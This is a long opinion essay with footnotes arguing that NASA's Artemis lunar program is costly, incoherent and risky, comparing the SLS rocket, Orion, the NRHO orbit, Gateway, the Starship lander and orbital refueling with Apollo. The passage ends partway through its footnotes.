Conclusion Notes A little over 51 years ago, a rocket lifted off from Cape Canaveral carrying three astronauts and a space car. After a three day journey to the moon, two of the astronauts climbed into a spindly lander and made the short trip down to the surface, where for another three days they collected rocks and did donuts in the space car. Then they climbed back into the lander, rejoined their colleague in orbit, and departed for Earth. Their capsule splashed down in the South Pacific on December 19, 1972. This mission, Apollo 17, would be the last time human beings ventured beyond low Earth orbit. If you believe NASA, late in 2026 Americans will walk on the moon again. That proposed mission is called Artemis 3, and its lunar segment looks a lot like Apollo 17 without the space car. Two astronauts will land on the moon, collect rocks, take selfies, and about a week after landing rejoin their orbiting colleagues to go back to Earth. But where Apollo 17 launched on a single rocket and cost $3.3 billion (in 2023 dollars), the first Artemis landing involves a dozen or two heavy rocket launches and costs so much that NASA refuses to give a figure (one veteran of NASA budgeting estimates it at $7-10 billion).[1] The single-use lander for the mission will be the heaviest spacecraft ever flown, and yet the mission's scientific return—a small box of rocks—is less than what came home on Apollo 17. And the whole plan hinges on technologies that haven't been invented yet becoming reliable and practical within the next eighteen months. You don’t have to be a rocket scientist to wonder what’s going on here. If we can put a man on the moon, then why can't we just go do it again? The moon hasn’t changed since the 1960’s, while every technology we used to get there has seen staggering advances. It took NASA eight years to go from nothing to a moon landing at the dawn of the Space Age. But today, twenty years and $93 billion after the space agency announced our return to the moon, the goal seems as far out of reach as ever.[2] Articles about Artemis often give the program’s tangled backstory. But I want to talk about Artemis as a technical design, because there’s just so much to drink in. While NASA is no stranger to complex mission architectures, Artemis goes beyond complex to the just plain incoherent. None of the puzzle pieces seem to come from the same box. Half the program requires breakthrough technologies that make the other half unnecessary. The rocket and spacecraft NASA spent two decades building can’t even reach the moon. And for reasons no one understands, there’s a new space station in the mix. In the past, whatever oddball project NASA came up with, we at least knew they could build the hardware. But Artemis calls the agency’s competence as an engineering organization into question. For the first time since the early 1960's, it's unclear whether the US space agency is even capable of putting astronauts on the moon. A Note on Apollo In this essay I make a lot of comparisons to Project Apollo. This is not because I think other mission architectures are inferior, but because the early success of that program sets such a useful baseline. At the dawn of the Space Age, using rudimentary technology, American astronauts landed on the moon six times in seven attempts. The moon landings were NASA’s greatest achievement and should set a floor for what a modern mission, flying modern hardware, might achieve. Advocates for Artemis insist that the program is more than Apollo 2.0. But as we’ll see, Artemis can't even measure up to Apollo 1.0. It costs more, does less, flies less frequently, and exposes crews to risks that the steely-eyed missile men of the Apollo era found unacceptable. It's as if Ford in 2024 released a new model car that was slower, more accident-prone, and ten times more expensive than the Model T. When a next-generation lunar program can’t meet the cost, performance, or safety standards set three generations earlier, something has gone seriously awry. I. The Rocket The jewel of Artemis is a big orange rocket with a flavorless name, the Space Launch System (SLS). SLS looks like someone started building a Space Shuttle and ran out of legos for the orbiter. There is the familiar orange tank, a big white pair of solid rocket boosters, but then the rocket just peters out in a 1960’s style stack of cones and cylinders. The best way to think of SLS is as a balding guy with a mullet: there are fireworks down below that are meant to distract you from a sad situation up top. In the case of the rocket, those fireworks are a first stage with more thrust than the Saturn V, enough thrust that the boosted core stage can nearly put itself into orbit. But on top of this monster sits a second stage so anemic that even its name (the Interim Cryogenic Propulsion Stage) is a kind of apology. For eight minutes SLS roars into the sky on a pillar of fire. And then, like a cork popping out of a bottle, the tiny ICPS emerges and drifts vaguely moonwards on a wisp of flame. With this design, the minds behind SLS achieved a first in space flight, creating a rocket that is at the same time more powerful and less capable than the Saturn V. While the 1960’s giant could send 49 metric tons to the moon, SLS only manages 27 tons—not enough to fly an Apollo-style landing, not enough to even put a crew in orbit around the moon without a lander. The best SLS can do is slingshot the Orion spacecraft once around the moon and back, a mission that will fly under the name Artemis 2. NASA wants to replace ICPS with an ‘Exploration Upper Stage’ (the project has been held up, among other things, by a near-billion dollar cost overrun on a launch pad). But even that upgrade won’t give SLS the power of the Saturn V. For whatever reason, NASA designed its first heavy launcher in forty years to be unable to fly the simple, proven architecture of the Apollo missions. Of course, plenty of rockets go on to enjoy rewarding, productive careers without being as powerful as the Saturn V. And if SLS rockets were piling up at the Michoud Assembly Facility like cordwood, or if NASA were willing to let its astronauts fly commercial, it would be a simple matter to split Artemis missions across multiple launches. But NASA insists that astronauts fly SLS. And SLS is a “one and done” rocket, artisanally hand-crafted by a workforce that likes to get home before traffic gets bad. The rocket can only launch once every two years at a cost of about four billion dollars[3]—about twice what it would cost to light the rocket’s weight in dollar bills on fire[4]. Early on, SLS designers made the catastrophic decision to reuse Shuttle hardware, which is like using Fabergé eggs to save money on an omelette. The SLS core stage recycles Space Shuttle main engines, actual veterans of old Shuttle flights called out of retirement for one last job. Refurbishing a single such engine to work on SLS costs NASA $40 million, or a bit more than SpaceX spends on all 33 engines on its Superheavy booster.[5] And though the Shuttle engines are designed to be fully reusable (the main reason they're so expensive), every SLS launch throws four of them away. Once all the junkyards are picked clean, NASA will pay Aerojet Rocketdyne to restart production of the classic engine at a cool unit cost of $145 million[6]. The story is no better with the solid rocket boosters, the other piece of Shuttle hardware SLS reuses. Originally a stopgap measure introduced to save the Shuttle budget, these heavy rockets now attach themselves like barnacles to every new NASA launcher design. To no one’s surprise, retrofitting a bunch of heavy steel casings left over from Shuttle days has saved the program nothing. Each SLS booster is now projected to cost $266 million, or about twice the launch cost of a Falcon Heavy.[7] Just replacing the asbestos lining in the boosters with a greener material, a project budgeted at $4.4M, has now cost NASA a quarter of a billion dollars. And once the leftover segments run out seven rockets from now, SLS will need a brand new booster design, opening up fertile new vistas of overspending. Costs on SLS have reached the point where private industry is now able to develop, test, and launch an entire rocket program for less than NASA spends on a single engine[8]. Flying SLS is like owning a classic car—everything is hand built, the components cost a fortune, and when you finally get the thing out of the shop, you find yourself constantly overtaken by younger rivals. But the cost of SLS to NASA goes beyond money. The agency has committed to an antiquated frankenrocket just as the space industry is entering a period of unprecedented innovation. While other space programs get to romp and play with technologies like reusable stages and exotic alloys, NASA is stuck for years wasting a massive, skilled workforce on a dead-end design. The SLS program's slow pace also affects safety. Back in the Shuttle era, NASA managers argued that it took three to four launches a year to keep workers proficient enough to build and launch the vehicles safely. A boutique approach where workers hand-craft one rocket every two years means having to re-learn processes and procedures with every launch. It also leaves no room in Artemis for test flights. The program simply assumes success, flying all its important 'firsts' with astronauts on board. When there are unanticipated failures, like the extensive heat shield spalling and near burn-through observed in Artemis 1,[9] the agency has no way to test a proposed fix without a multi-year delay to the program. So they end up using indirect means to convince themselves that a new design is safe to fly, a process ripe for error and self-delusion. II. The Capsule Orion, the capsule that launches on top of SLS, is a relaxed-fit reimagining of the Apollo command module suitable for today’s larger astronaut. It boasts modern computers, half again as much volume as the 1960’s design, and a few creature comforts (like not having to poop in a baggie) that would have pleased the Apollo pioneers. The capsule’s official name is the Orion Multipurpose Crew Vehicle, but finding even a single purpose for Orion has greatly challenged NASA. For twenty years the spacecraft has mostly sat on the ground, chewing through a $1.2 billion annual budget. In 2014, the first Orion flew a brief test flight. Eight short years later, Orion launched again, carrying a crew of instrumented mannequins around the moon on Artemis 1. In 2025 the capsule (by then old enough to drink) is supposed to fly human passengers on Artemis 2. Orion goes to space attached to a basket of amenities called the European Service Module. The ESM provides Orion with solar panels, breathing gas, batteries, and a small rocket that is the capsule’s principal means of propulsion. But because the ESM was never designed to go to the moon, it carries very little propellant—far too little to get the hefty capsule in and out of lunar orbit.[10] And Orion is hefty. Originally designed to hold six astronauts, the capsule was never resized when the crew requirement shrank to four. Like an empty nester’s minivan, Orion now hauls around a bunch of mass and volume that it doesn’t need. Even with all the savings that come from replacing Apollo-era avionics, the capsule weighs almost twice as much as the Apollo Command Module. This extra mass has knock-on effects across the entire Artemis design. Since a large capsule needs a large abort rocket, SLS has to haul Orion's massive Launch Abort System—seven tons of dead weight—nearly all the way into orbit. And reinforcing the capsule so that abort system won't shake the astronauts into jelly means making it heavier, which puts more demand on the parachutes and heat shield, and around and around we go. Size comparison of the Apollo command and service module (left) and Orion + European Service Module (right) What’s particularly frustrating is that Orion and ESM together have nearly the same mass as the Apollo command and service modules, which had no trouble reaching the moon. The difference is all in the proportions. Where Apollo was built like a roadster, with a small crew compartment bolted onto an oversized engine, Orion is the Dodge Journey of spacecraft—a chunky, underpowered six-seater that advertises to the world that you're terrible at managing money. III. The Orbit The fact that neither its rocket or spaceship can get to the moon creates difficulties for NASA’s lunar program. So, like an aging crooner transposing old hits into an easier key, the agency has worked to find a ‘lunar-adjacent’ destination that its hardware can get to. Their solution is a bit of celestial arcana called Near Rectilinear Halo Orbit, or NRHO. A spacecraft in this orbit circles the moon every 6.5 days, passing 1,000 kilometers above the lunar north pole at closest approach, then drifting out about 70,000 kilometers (a fifth of the Earth/Moon distance) at its furthest point. Getting to NRHO from Earth requires significantly less energy than entering a useful lunar orbit, putting it just within reach for SLS and Orion.[11] To hear NASA tell it, NRHO is so full of advantages that it’s a wonder we stay on Earth. Spacecraft in the orbit always have a sightline to Earth and never pass through its shadow. The orbit is relatively stable, so a spacecraft can loiter there for months using only ion thrusters. And the deep space environment is the perfect place to practice going to Mars. But NRHO is terrible for getting to the moon. The orbit is like one of those European budget airports that leaves you out in a field somewhere, requiring an expensive taxi. In Artemis, this taxi takes the form of a whole other spaceship—the lunar lander—which launches without a crew a month or two before Orion and is supposed to be waiting in NRHO when the capsule arrives. Once these two spacecraft dock together, two astronauts climb into the lander from Orion and begin a day-long descent to the lunar surface. The other two astronauts wait for them in NRHO, playing hearts and quietly absorbing radiation. Apollo landings also divided the crew between lander and orbiter. But those missions kept the command module in a low lunar orbit that brought it over the landing site every two hours. This proximity between orbiter and lander had enormous implications for safety. At any point in the surface mission, the astronauts on the moon could climb into the ascent rocket, hit the big red button, and be back sipping Tang with the command module pilot by bedtime. The short orbital period also gave the combined crew a dozen opportunities a day to return directly to Earth. [12] Sitting in NRHO makes abort scenarios much harder. Depending on when in the mission it happens, a stricken lander might need three or more days to catch up with the orbiting Orion. In the worst case, the crew might find themselves stuck on the lunar surface for hours after an abort is called, forced to wait for Orion to reach a more favorable point in its orbit. And once everyone is back on Orion, more days might pass before the crew can depart for Earth. These long and variable abort times significantly increase risk to the crew, making many scenarios that were survivable on Apollo (like Apollo 13!) lethal on Artemis. [13] The abort issue is just one example of NRHO making missions slower. NASA likes to boast that Orion can stay in space far longer than Apollo, but this is like bragging that you’re in the best shape of your life after the bank repossessed your car. It's an oddly positive spin to put on bad life choices. The reason Orion needs all that endurance is because transit times from Earth to NRHO are long, and the crew has to waste additional time in NRHO waiting for orbits to line up. The Artemis 3 mission, for example, will spend 24 days in transit, compared to just 6 days on Apollo 11. NRHO even dictates how long astronauts stay on the moon—surface time has to be a multiple of the 6.5 day orbital period. This lack of flexibility means that even early flag-and-footprints missions like Artemis 3 have to spend at least a week on the moon, a constraint that adds considerable risk to the initial landing. [14] In spaceflight, brevity is safety. There's no better way to protect astronauts from the risks of solar storms, mechanical failure, and other mishaps than by minimizing slack time in space. Moreover, a safe architecture should allow for a rapid return to Earth at any point in the mission. There’s no question astronauts on the first Artemis missions would be better off with Orion in low lunar orbit. The decision to stage from NRHO is an excellent example of NASA designing its lunar program in the wrong direction—letting deficiencies in the hardware dictate the level of mission risk. ￼ Early diagram of Gateway. Note that the segment marked 'human lander system' now dwarfs the space station. IV. Gateway I suppose at some point we have to talk about Gateway. Gateway is a small modular space station that NASA wants to build in NRHO. It has been showing up across various missions like a bad smell since before 2012. Early in the Artemis program, NASA described Gateway as a kind of celestial truck stop, a safe place for the lander to park and for the crew to grab a cup of coffee on their way to the moon. But when it became clear that Gateway would not be ready in time for Artemis 3, NASA re-evaluated. Reasoning that two spacecraft could meet up in NRHO just as easily as three, the agency gave permission for the first moon landing to proceed without a space station. Despite this open admission that Gateway is unnecessary, building the space station remains the core activity of the Artemis program. The three missions that follow that first landing are devoted chiefly to Gateway assembly. In fact, initial plans for Artemis 4 left out a lunar landing entirely, as if it were an inconvenience to the real work being done up in orbit. This is a remarkable situation. It’s like if you hired someone to redo your kitchen and they started building a boat in your driveway. Sure, the boat gives the builders a place to relax, lets them practice tricky plumbing and finishing work, and is a safe place to store their tools. But all those arguments will fail to satisfy. You still want to know what building a boat has to do with kitchen repair, and why you’re the one footing the bill. NASA has struggled to lay out a technical rationale for Gateway. The space station adds both cost and complexity to Artemis, a program not particularly lacking in either. Requiring moon-bound astronauts to stop at Gateway also makes missions riskier (by adding docking operations) while imposing a big propellant tax. Aerospace engineer and pundit Robert Zubrin has aptly called the station a tollbooth in space. Even Gateway defenders struggle to hype up the station. A common argument is that Gateway may not ideal for any one thing, but is good for a whole lot of things. But that is the same line of thinking that got us SLS and Orion, both vehicles designed before anyone knew what to do with them. The truth is that all-purpose designs don't exist in human space flight. The best you can do is build a spacecraft that is equally bad at everything. But to search for technical grounds is to misunderstand the purpose of Gateway. The station is not being built to shelter astronauts in the harsh environment of space, but to protect Artemis in the harsh environment of Congress. NASA needs Gateway to navigate an uncertain political landscape in the 2030’s. Without a station, Artemis will just be a series of infrequent multibillion dollar moon landings, a red cape waved in the face of the Office of Management and Budget. Gateway armors Artemis by bringing in international partners, each of whom contributes expensive hardware. As NASA learned building the International Space Station, this combination of sunk costs and international entanglement is a powerful talisman against program death. Gateway also solves some other problems for NASA. It gives SLS a destination to fly to, stimulates private industry (by handing out public money to supply Gateway), creates a job for the astronaut corps, and guarantees the continuity of human space flight once the ISS becomes uninhabitable sometime in the 2030’s. [15] That last goal may sound odd if you don’t see human space flight as an end in itself. But NASA is a faith-based organization, dedicated to the principle that taxpayers should always keep an American or two in orbit. it’s a little bit as if the National Oceanic Atmospheric Administration insisted on keeping bathyscapes full of sailors at the bottom of the sea, irrespective of cost or merit, and kneecapped programs that might threaten the continuous human benthic presence. You can’t argue with faith. From a bureaucrat’s perspective, Gateway is NASA’s ticket back to a golden era in the early 2000's when the Space Station and Space Shuttle formed an uncancellable whole, each program justifying the existence of the other. Recreating this dynamic with Gateway and SLS/Orion would mean predictable budgets and program stability for NASA well into the 2050’s. But Artemis was supposed to take us back to a different golden age, the golden age of Apollo. And so there’s an unresolved tension in the program between building Gateway and doing interesting things on the moon. With Artemis missions two or more years apart, it’s inevitable that Gateway assembly will push aspirational projects like a surface habitat or pressurized rover out into the 2040’s. But those same projects are on the critical path to Mars, where NASA still insists we’re going in the late 2030’s. The situation is awkward. So that is the story of Gateway—unloved, ineradicable, and as we’ll see, likely to become the sole legacy of the Artemis program. ￼ V. The Lander The lunar lander is the most technically ambitious part of Artemis. Where SLS, Orion, and Gateway are mostly a compilation of NASA's greatest hits, the lander requires breakthrough technologies with the potential to revolutionize space travel. Of course, you can’t just call it a lander. In Artemis speak, this spacecraft is the Human Landing System, or HLS. NASA has delegated its design to two private companies, Blue Origin and SpaceX. SpaceX is responsible for landing astronauts on Artemis 3 and 4, while Blue Origin is on the hook for Artemis 5 (notionally scheduled for 2030). After that, the agency will take competitive bids for subsequent missions. The SpaceX HLS design is based on their experimental Starship spacecraft, an enormous rocket that takes off on and lands on its tail, like 1950’s sci-fi. There is a strong “emperor’s new clothes” vibe to this design. On the one hand, it is the brainchild of brilliant SpaceX engineers and passed NASA technical review. On the other hand, the lander seems to go out of its way to create problems for itself to solve with technology. An early SpaceX rendering of the Human Landing System, with the Apollo Lunar Module added for scale. To start with the obvious, HLS looks more likely to tip over than the last two spacecraft to land on the moon, which tipped over. It is a fifteen story tower that must land on its ass in terrible lighting conditions, on rubble of unknown composition, over a light-second from Earth. The crew are left suspended so high above the surface that they need a folding space elevator (not the cool kind) to get down. And yet in the end this single-use lander carries less payload (both up and down) than the tiny Lunar Module on Apollo 17. Using Starship to land two astronauts on the moon is like delivering a pizza with an aircraft carrier. Amusingly, the sheer size of the SpaceX design leaves it with little room for cargo. The spacecraft arrives on the Moon laden with something like 200 tons of cryogenic propellant,[16] and like a fat man leaving an armchair, it needs every drop of that energy to get its bulk back off the surface. Nor does it help matters that all this cryogenic propellant has to cook for a week in direct sunlight. Other, less daring lander designs reduce their appetite for propellant by using a detachable landing stage. This arrangement also shields the ascent rocket from hypervelocity debris that gets kicked up during landing. But HLS is a one-piece rocket; the same engines that get sandblasted on their way down to the moon must relight without fail a week later. Given this fact, it’s remarkable that NASA’s contract with SpaceX doesn’t require them to demonstrate a lunar takeoff. All SpaceX has to do to satisfy NASA requirements is land an HLS prototype on the Moon. Questions about ascent can then presumably wait until the actual mission, when we all find out together with the crew whether HLS can take off again.[17] This fearlessness in design is part of a pattern with Starship HLS. Problems that other landers avoid in the design phase are solved with engineering. And it’s kind of understandable why SpaceX does it this way. Starship is meant to fly to Mars, a much bigger challenge than landing two people on the moon. If the basic Starship design can’t handle a lunar landing, it would throw the company’s whole Mars plan into question. SpaceX is committed to making Starship work, which is different from making the best possible lunar lander. Less obvious is why NASA tolerates all this complexity in the most hazardous phase of its first moon mission. Why land a rocket the size of a building packed with moving parts? It’s hard to look at the HLS design and not think back to other times when a room full of smart NASA people talked themselves into taking major risks because the alternative was not getting to fly at all. It’s instructive to compare the HLS approach to the design philosophy on Apollo. Engineers on that progam were motivated by terror; no one wanted to make the mistake that would leave astronauts stranded on the moon. The weapon they used to knock down risk was simplicity. The Lunar Module was a small metal box with a wide stance, built low enough so that the astronauts only needed to climb down a short ladder. The bottom half of the LM was a descent stage that completely covered the ascent rocket (a design that showed its value on Apollo 15, when one of the descent engines got smushed by a rock). And that ascent rocket, the most important piece of hardware in the lander, was a caveman design intentionally made so primitive that it would struggle to find ways to fail. On Artemis, it's the other way around: the more hazardous the mission phase, the more complex the hardware. It's hard to look at all this lunar machinery and feel reassured, especially when NASA's own Aerospace Safety Advisory Panel estimates that the Orion/SLS portion of a moon mission alone (not including anything to do with HLS) already has a 1:75 chance of killing the crew. VI. Refueling Since NASA’s biggest rocket struggles to get Orion into distant lunar orbit, and HLS weighs fifty times as much as Orion, the curious reader might wonder how the unmanned lander is supposed to get up there. NASA’s answer is, very sensibly, “not our problem”. They are paying Blue Origin and SpaceX the big bucks to figure this out on their own. And as a practical matter, the only way to put such a massive spacecraft into NRHO is to first refuel it in low Earth orbit. Like a lot of space technology, orbital refueling sounds simple, has never been attempted, and can’t be adequately simulated on Earth.[18] The crux of the problem is that liquid and gas phases in microgravity jumble up into a three-dimensional mess, so that even measuring the quantity of propellant in a tank becomes difficult. To make matters harder, Starship uses cryogenic propellants that boil at temperatures about a hundred degrees colder than the plumbing they need to move through. Imagine trying to pour water from a thermos into a red-hot skillet while falling off a cliff and you get some idea of the difficulties. To get refueling working, SpaceX will first have to demonstrate propellant transfer between rockets as a proof of concept, and then get the process working reliably and efficiently at a scale of hundreds of tons. (These are two distinct challenges). Once they can routinely move liquid oxygen and methane from Starship A to Starship B, they’ll be ready to set up the infrastructure they need to launch HLS. The plan for getting HLS to the moon looks like this: a few months before the landing date, SpaceX will launch a special variant of their Starship rocket configured to serve as a propellant depot. Then they'll start launching Starships one by one to fill it up. Each Starship arrives in low Earth orbit with some residual propellant; it will need to dock with the depot rocket and transfer over this remnant fuel. Once the depot is full, SpaceX will launch HLS, have it fill its tanks at the depot rocket, and send it up to NRHO in advance of Orion. When Orion arrives, HLS will hopefully have enough propellant left on board to take on astronauts and make a single round trip from NRHO to the lunar surface. Getting this plan to work requires solving a second engineering problem, how to keep cryogenic propellants cold in space. Low earth orbit is a toasty place, and without special measures, the cryogenic propellants Starship uses will quickly vent off into space. The problem is easy to solve in deep space (use a sunshade), but becomes tricky in low Earth orbit, where a warm rock covers a third of the sky. (Boil-off is also a big issue for HLS on the moon.) It’s not clear how many Starship launches it will take to refuel HLS. Elon Musk has said four might be enough; NASA Assistant Deputy Associate Administrator Lakiesha Hawkins says the number is in the “high teens”. Last week, SpaceX's Kathy Lueders gave a figure of fifteen launches. The real number is unknown and will come down to four factors: How much propellant a Starship can carry to low Earth orbit. What fraction of that can be usably pumped out of the rocket. How quickly cryogenic propellant boils away from the orbiting depot. How rapidly SpaceX can launch Starships. SpaceX probably knows the answer to (1), but isn’t talking. Data for (2) and (3) will have to wait for flight tests that are planned for 2025. And obviously a lot is riding on (4), also called launch cadence. The record for heavy rocket launch cadence belongs to Saturn V, which launched three times during a four month period in 1968. Second place belongs to the Space Shuttle, which flew nine times in the calendar year before the Challenger disaster. In third place is Falcon Heavy, which flew six times in a 13 month period beginning in November 2022. For the refueling plan to work, Starship will have to break this record by a factor of ten, launching every six days or so across multiple launch facilities. [19] The refueling program can tolerate a few launch failures, as long as none of them damages a launch pad. There’s no company better prepared to meet this challenge than SpaceX. Their Falcon 9 rocket has shattered records for both reliability and cadence, and now launches about once every three days. But it took SpaceX ten years to get from the first orbital Falcon 9 flight to a weekly cadence, and Starship is vastly bigger and more complicated than the Falcon 9. [20] Working backwards from the official schedule allows us to appreciate the time pressure facing SpaceX. To make the official Artemis landing date, SpaceX has to land an unmanned HLS prototype on the moon in early 2026. That means tanker flights to fill an orbiting depot would start in late 2025. This doesn’t leave a lot of time for the company to invent orbital refueling, get it working at scale, make it efficient, deal with boil-off, get Starship launching reliably, begin recovering booster stages,[21] set up additional launch facilities, achieve a weekly cadence, and at the same time design and test all the other systems that need to go into HLS. Lest anyone think I’m picking on SpaceX, the development schedule for Blue Origin’s 2029 lander is even more fantastical. That design requires pumping tons of liquid hydrogen between spacecraft in lunar orbit, a challenge perhaps an order of magnitude harder than what SpaceX is attempting. Liquid hydrogen is bulky, boils near absolute zero, and is infamous for its ability to leak through anything (the Shuttle program couldn't get a handle on hydrogen leaks on Earth even after a hundred some launches). And the rocket Blue Origin needs to test all this technology has never left the ground. The upshot is that NASA has put a pair of last-minute long-shot technology development programs between itself and the moon. Particularly striking is the contrast between the ambition of the HLS designs and the extreme conservatism and glacial pace of SLS/Orion. The same organization that spent 23 years and 20 billion dollars building the world's most vanilla spacecraft demands that SpaceX darken the sky with Starships within four years of signing the initial HLS contract. While thrilling for SpaceX fans, this is pretty unserious behavior from the nation’s space agency, which had several decades' warning that going to the moon would require a lander. All this to say, it's universally understood that there won’t be a moon landing in 2026. At some point NASA will have to officially slip the schedule, as it did in 2021, 2023, and at the start of this year. If this accelerating pattern of delays continues, by year’s end we might reach a state of continuous postponement, a kind of scheduling singularity where the landing date for Artemis 3 recedes smoothly and continuously into the future. Otherwise, it's hard to imagine a manned lunar landing before 2030, if the Artemis program survives that long. VII. Conclusion I want to stress that there’s nothing wrong with NASA making big bets on technology. Quite the contrary, the audacious HLS contracts may be the healthiest thing about Artemis. Visionaries at NASA identified a futuristic new energy source (space billionaire egos) and found a way to tap it on a fixed-cost basis. If SpaceX or Blue Origin figure out how to make cryogenic refueling practical, it will mean a big step forward for space exploration, exactly the thing NASA should be encouraging. And if the technology doesn’t pan out, we’ll have found that out mostly by spending Musk’s and Bezos’s money. The real problem with Artemis is that it doesn’t think through the consequences of its own success. A working infrastructure for orbital refueling would make SLS and Orion superfluous. Instead of waiting two years to go up on a $4 billion rocket, crews and cargo could launch every weekend on cheap commercial rockets, refueling in low Earth orbit on their way to the moon. A similar logic holds for Gateway. Why assemble a space station out of habitrail pieces out in lunar orbit, like an animal, when you can build one on Earth and launch it in one piece? Better yet, just spraypaint “GATEWAY” on the side of the nearest Starship, send it out to NRHO, and save NASA and its international partners billions. Having a working gas station in low Earth orbit fundamentally changes what is possible, in a way the SLS/Orion arm of Artemis doesn't seem to recognize. Conversely, if SpaceX and Blue Origin can’t make cryogenic refueling work, then NASA has no plan B for landing on the moon. All the Artemis program will be able to do is assemble Gateway. Promising taxpayers the moon only to deliver ISS Jr. does not broadcast a message of national greatness, and is unlikely to get Congress excited about going to Mars. The hurtful comparisons between American dynamism in the 1960’s and whatever it is we have now will practically write themselves. What NASA is doing is like an office worker blowing half their salary on lottery tickets while putting the other half in a pension fund. If the lottery money comes through, then there was really no need for the pension fund. But without the lottery win, there’s not enough money in the pension account to retire on. The two strategies don't make sense together. There’s a ‘realist’ school of space flight that concedes all this but asks us to look at the bigger picture. We’re never going to have the perfect space program, the argument goes, but the important thing is forward progress. And Artemis is the first program in years to survive a presidential transition and have a shot at getting us beyond low Earth orbit. With Artemis still funded, and Starship making rapid progress, at some point we’ll finally see American astronauts back on the moon. But this argument has two flaws. The first is that it feeds a cycle of dysfunction at NASA that is rapidly making it impossible for us to go anywhere. Holding human space flight to a different standard than NASA’s science missions has been a disaster for space exploration. Right now the Exploration Systems Development Mission Directorate (the entity responsible for manned space flight) couldn’t build a toaster for less than a billion dollars. Incompetence, self-dealing, and mismanagement that end careers on the science side of NASA are not just tolerated but rewarded on the human space flight side. Before we let the agency build out its third white elephant project in forty years, it’s worth reflecting on what we're getting in return for half our exploration budget. The second, more serious flaw in the “realist” approach is that it enables a culture of institutional mendacity that must ultimately be fatal at an engineering organization. We've reached a point where NASA lies constantly, to both itself and to the public. It lies about schedules and capabilities. It lies about the costs and the benefits of its human spaceflight program. And above all, it lies about risk. All the institutional pathologies identified in the Rogers Report and the Columbia Accident Investigation Board are alive and well in Artemis—groupthink, management bloat, intense pressure to meet impossible deadlines, and a willingness to manufacture engineering rationales to justify flying unsafe hardware. Do we really have to wait for another tragedy, and another beautifully produced Presidential Commission report, to see that Artemis is broken? Notes [1] Without NASA's help, it's hard to put a dollar figure on a mission without making somewhat arbitrary decisions about what to include and exclude. The $7-10 billion estimate comes from a Bush-era official in the Office of Management and Budget commenting on the NASA Spaceflight Forum And that $7.2B assumes Artemis III stays on schedule. Based on the FY24 budget request, each additional year between Artemis II and Artemis III adds another $3.5B to $4.0B in Common Exploration to Artemis III. If Artemis III goes off in 2027, then it will be $10.8B total. If 2028, then $14.3B. In other words, it's hard to break out an actual cost while the launch dates for both Artemis II and III keep slipping. NASA's own Inspector General estimates the cost of just the SLS/Orion portion of a moon landing at $4.1 billion. [2] The first US suborbital flight, Friendship 7, launched on May 15, 1961. Armstrong and Aldrin landed on the moon eight years and two months later, on July 21, 1969. President Bush announced the goal of returning to the moon in a January 2004 speech, setting the target date for the first landing \"as early as 2015\", and no later than 2020. [3] NASA refuses to track the per-launch cost of SLS, so it's easy to get into nerdfights. Since the main cost driver on SLS is the gigantic workforce employed on the project, something like two or three times the headcount of SpaceX, the cost per launch depends a lot on cadence. If you assume a yearly launch rate (the official line), then the rocket costs $2.1 billion a launch. If like me you think one launch every two years is optimistic, the cost climbs up into the $4-5 billion range. [4] The SLS weighs 2,600 metric tons fully fueled, and conveniently enough a dollar bill weighs about 1 gram. [5] SpaceX does not disclose the cost, but it's widely assumed the Raptor engine used on Superheavy costs $1 million. [6] The $145 million figure comes from dividing the contract cost by the number of engines, caveman style. Others have reached a figure of $100 million for the unit cost of these engines. The important point is not who is right but the fact that NASA is paying vastly more than anyone else for engines of this class. [7] $250M is the figure you get by dividing the $3.2 billion Booster Production and Operations contract to Northrop Grumman by the number of boosters (12) in the contract. Source: Office of the Inspector General. For cost overruns replacing asbestos, see the OIG report on NASA’s Management of the Space Launch System Booster and Engine Contracts. The Department of Defense paid $130 million for a Falcon Heavy launch in 2023. [8] Rocket Lab developed, tested, and flew its Electron rocket for a total program cost of $100 million. [9] In particular, the separation bolts embedded in the Orion heat shield were built based on a flawed thermal model, and need to be redesigned to safely fly a crew. From the OIG report: Separation bolt melt beyond the thermal barrier during reentry can expose the vehicle to hot gas ingestion behind the heat shield, exceeding Orion’s structural limits and resulting in the breakup of the vehicle and loss of crew. Post-flight inspections determined there was a discrepancy in the thermal model used to predict the bolts’ performance pre-flight. Current predictions using the correct information suggest the bolt melt exceeds the design capability of Orion. The current plan is to work around these problems on Artemis 2, and then redesign the components for Artemis 3. That means astronauts have to fly at least twice with an untested heat shield design. [10] Orion/ESM has a delta V budget of 1340 m/s. Getting into and out of an equatorial low lunar orbit takes about 1800 m/s, more for a polar orbit. (See source.) [11] It takes about 900 m/s of total delta V to get in and out of NHRO, comfortably within Orion/ESM's 1340 m/s budget. (See source.) [12] In Carrying the Fire, Apollo 11 astronaut Michael Collins recalls carrying a small notebook covering 18 lunar rendezvous scenarios he might be called on to fly in various contingencies. If the Lunar Module could get itself off the surface, there was probably a way to dock with it. For those too young to remember, Tang is a powdered orange drink closely associated with the American space program. [13] For a detailed (if somewhat cryptic) discussion of possible Artemis abort modes to NRHO, see HLS NRHO to Lunar Surface and Back Mission Design, NASA 2022. [14] The main safety issue is the difficult thermal environment at the landing site, where the Sun sits just above the horizon, heating half the lander. If it weren't for the NRHO constraint, it's very unlikely Artemis 3 would spend more than a day or two on the lunar surface. [15] The ISS program has been repeatedly extended, but the station is coming up against physical limiting factors (like metal fatigue) that will soon make it too dangerous to use. [16] This is my own speculative guess; the answer is very sensitive to the dry weight of HLS and the boil-off rate of its cryogenic propellants. Delta V from the lunar surface to NRHO is 2,610 m/sec. Assuming HLS weighs 120 tons unfueled, it would need about 150 metric tons of propellant to get into NRHO from the lunar surface. Adding safety margin, fuel for docking operations, and allowing for a week of boiloff gets me to about 200 tons. [17] Recent comments by NASA suggest SpaceX has voluntarily added an ascent phase to its landing demo, ending a pretty untenable situation. However, there's still no requirement that the unmanned landing/ascent demo be performed using the same lander design that will fly on the actual mission, another oddity in the HLS contract. [18] To be precise, I'm talking about moving bulk propellant between rockets in orbit. There are resupply flights to the International Space Station that deliver about 850 kilograms of non-cryogenic propellant to boost the station in its orbit, and there have been small-scale experiments in refueling satellites. But no one has attempted refueling a flown rocket stage in space, cryogenic or otherwise. [19] Both SpaceX's Kathy Lueders and NASA confirm Starship needs to launch from multiple sites. Here's an excerpt from the minutes of the NASA Advisory Council Human Exploration and Operations Committee meeting on November 17 and 20, 2023: Mr. [Wayne] Hale asked where Artemis III will launch from. [Assistant Deputy AA for Moon to Mars Lakiesha] Hawkins said that launch pads will be used in Florida and potentially Texas. The missions will need quite a number of tankers; in order to meet the schedule, there will need to be a rapid succession of launches of fuel, requiring more than one site for launches on a 6-day rotation schedule, and multiples of launches. [20] Falcon 9 first flew in June of 2010 and 